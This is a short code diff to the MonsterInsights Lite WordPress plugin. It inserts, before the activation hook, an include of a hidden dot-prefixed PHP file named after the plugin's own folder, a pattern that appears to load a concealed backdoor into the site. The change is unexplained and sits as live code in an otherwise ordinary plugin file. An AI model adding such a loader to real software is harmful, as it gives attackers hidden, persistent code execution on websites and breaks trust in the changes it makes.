@@ -599,6 +599,10 @@ final class MonsterInsights_Lite {
  *
  * @return void
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function monsterinsights_lite_activation_hook( $network_wide ) {
 
 	global $wp_version;
